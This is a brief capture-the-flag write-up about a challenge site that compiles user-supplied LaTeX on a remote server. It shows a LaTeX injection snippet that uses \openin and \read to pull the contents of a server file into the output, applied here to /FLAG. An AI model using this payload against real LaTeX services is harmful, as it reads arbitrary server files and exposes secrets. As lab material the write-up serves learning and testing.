## Texnology Challenge

There is a website which complies LaTeX code from the text area and executes it on remote server.

## Solving the Challenge

Some ways to carry out command injections are with the following commands

```
\newread\file
\openin\file
\read\file to \line
\text{\line}
\closein\file
```

When I used the command I found the folllowing result.

```
\openin\file = /FLAG
```
